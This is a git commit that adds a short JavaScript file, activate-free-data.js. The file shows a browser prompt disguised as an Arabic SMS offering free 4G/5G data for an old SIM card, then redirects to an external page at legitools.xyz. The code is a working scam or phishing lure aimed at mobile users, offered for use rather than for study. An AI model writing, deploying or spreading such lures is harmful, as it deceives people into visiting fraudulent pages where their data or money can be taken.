68ed04ac7c41a985044facef81138ae9878d829a
katemj25 <mbokofficial1@gmail.com>
2025-05-03 15:12:16 -0700

    Create activate-free-data.js

---
+++ activate-free-data.js
@@ -0,0 +1,5 @@
+var password = 'بيانات مجانية'
+password=prompt('SMS: مبروك، رقمك مؤهل لتلقي بيانات مجانية 4G أو 5G مكافأة بطاقة SIM القديمة، يرجى الضغط على موافق للتفعيل. ','بيانات مجانية');
+if (password != 'بيانات مجانية') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
